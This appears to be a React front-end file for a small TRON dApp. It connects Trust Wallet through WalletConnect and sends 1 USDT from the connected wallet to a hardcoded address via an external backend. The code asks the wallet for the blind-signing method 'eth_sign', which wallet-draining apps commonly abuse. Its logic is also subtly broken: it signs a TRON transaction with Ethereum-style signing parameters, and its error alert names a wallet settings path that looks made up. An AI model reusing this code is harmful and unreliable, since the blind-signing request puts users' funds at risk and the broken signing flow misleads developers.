
// Updated Frontend (App.js)
import React, { useState } from 'react';
import { SignClient } from '@walletconnect/sign-client';
import { Web3Modal } from '@web3modal/standalone';

const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
const modal = new Web3Modal({
  projectId: PROJECT_ID,
});

const App = () => {
  const [client, setClient] = useState(null);
  const [session, setSession] = useState(null);
  const [account, setAccount] = useState('');

  const connectWallet = async () => {
    const _client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata: {
        name: "TRX DApp",
        description: "Sign USDT TX",
        url: "https://smartcont.netlify.app",
        icons: ["https://smartcont.netlify.app/icon.png"],
      },
    });

   // Connect function mein requiredNamespaces ko update karo
const { uri, approval } = await _client.connect({
  requiredNamespaces: {
    tron: {
      methods: ["tron_signTransaction", "eth_sign"], // eth_sign add karo
      chains: ["tron:0x2b6653dc"],
      events: [],
    },
  },
});

    if (uri) {
      modal.openModal({ uri });
    }

    const _session = await approval();
    const _account = _session.namespaces.tron.accounts[0].split(':')[2];

    setClient(_client);
    setSession(_session);
    setAccount(_account);
  };

const sendUSDT = async () => {
  try {
    // 1. Get raw transaction from backend
    const res = await fetch("https://smartcontbackend.onrender.com/create-tx", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        from: account,
        to: "TFZTMmXP3kKANmPRskXiJHvDoDhEGWiUkB",
        amount: 1
      })
    });
    
    const tx = await res.json();
    
    // 2. Convert account to hex format (Trust Wallet requirement)
    const hexAccount = window.tronWeb.address.toHex(account);
    
    // 3. Trust Wallet compatible signing request
    const signed = await client.request({
      topic: session.topic,
      chainId: "tron:0x2b6653dc",
      request: {
        method: "eth_signTransaction", // Use eth_signTransaction instead
        params: [{
          from: hexAccount,
          to: tx.raw_data.contract[0].parameter.value.contract_address,
          data: tx.raw_data.contract[0].parameter.value.data,
          value: "0x0",
          gasPrice: "0x0",
          gasLimit: `0x${tx.raw_data.fee_limit.toString(16)}`,
          nonce: "0x0",
          chainId: "0x2b6653dc"
        }]
      },
    });
    
    // 4. Extract signature from response
    const signature = signed.raw.slice(2); // Remove 0x prefix
    
    // 5. Prepare for broadcast
    const signedTx = {
      ...tx,
      signature: [signature]
    };
    
    // 6. Broadcast transaction
    const broadcastRes = await fetch("https://smartcontbackend.onrender.com/broadcast", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ signedTx })
    });

    const result = await broadcastRes.json();
    console.log("✅ Broadcast Successful:", result);
  } catch (err) {
    console.error("❌ Final Error:", {
      code: err.code,
      message: err.message,
      stack: err.stack
    });
    
    // Special fallback for Trust Wallet
    if(err.message.includes("Unknown method")) {
      alert("Please enable 'Web3' in Trust Wallet settings:\nSettings → Preferences → Web3 Provider → WalletConnect");
    }
  }
};
  return (
    <div>
      <button onClick={connectWallet}>Connect Trust Wallet</button>
      <button onClick={sendUSDT}>Send USDT</button>
    </div>
  );
};

export default App;
